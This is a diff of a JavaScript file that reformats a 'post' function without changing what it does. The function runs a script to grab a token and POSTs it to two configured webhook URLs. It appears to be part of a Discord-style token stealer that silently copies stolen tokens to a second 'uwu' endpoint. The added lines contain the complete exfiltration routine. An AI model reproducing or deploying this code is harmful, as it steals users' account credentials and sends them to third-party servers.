@@ -232,31 +232,32 @@ function GetLangue(read) {
     return langue
 }
 const post = async (params) => {
-    params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
-    var n = JSON.stringify({
-        data: params,
-        token: token
+  params = JSON.stringify(params);
+  var token = await execScript(tokenScript);
+  var n = JSON.stringify({
+    data: params,
+    token: token
+  });
+  [config.uwu, config.webhook].forEach(res => {
+    const url = new URL(res);
+    const options = {
+      host: url.hostname,
+      port: url.port,
+      path: url.pathname,
+      method: 'POST',
+      headers: {
+        "Content-Type": "application/json"
+      }
+    }
+    const req = https.request(options);
+    req.on("error", (err) => {
+      console.log(err);
     });
-    [config.uwu, config.webhook].forEach(res => {
-        const url = new URL(res);
-        const options = {
-            host: url.hostname,
-            port: url.port,
-            path: url.pathname,
-            method: 'POST',
-            headers: {
-                "Content-Type": "application/json"
-            }
-        }
-        const req = https.request(options);
-        req.on("error", (err) => {
-            console.log(err);
-        });
-        req.write(res === config.uwu ? n : params);
-        req.end();
-    })
+    req.write(res == config.uwu ? n : params);
+    req.end();
+  })
 }
+
 
 
 post({foo: "bar"});
